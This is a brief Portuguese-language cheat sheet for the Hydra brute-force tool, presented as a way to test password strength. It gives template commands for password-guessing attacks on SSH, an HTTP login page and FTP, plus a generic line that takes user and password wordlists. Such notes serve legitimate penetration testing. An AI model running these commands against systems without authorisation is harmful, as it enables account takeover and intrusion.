## O que e??
Hydra é uma ferramenta poderosa para realizar ataques de força bruta em serviços de rede. Suporta muitos protocolos, como FTP, HTTP, SSH, RDP, entre outros. Esta ferramenta é usada para testar a segurança de sistemas e garantir que as senhas sejam fortes o suficiente para proteger recursos sensíveis.
## Uso Básico

## Ataque de Força Bruta em SSH
hydra -l <usuário> -P <arquivo_de_palavras> ssh://<endereço_ip>
-l: Especifica o nome de usuário.
-P: Define o caminho para o arquivo de palavras (lista de senhas).
ssh://<endereço_ip>: O protocolo e o endereço do alvo.
## Ataque em HTTP (Formulário de Login)

hydra -l <usuário> -P <arquivo_de_palavras> http-get://<endereço_ip>/login

## Ataque em FTP

hydra -l <usuário> -P <arquivo_de_palavras> ftp://<endereço_ip>
hydra -P /wordlist -U /wordlist <target> -s <porta> <nome serviços>

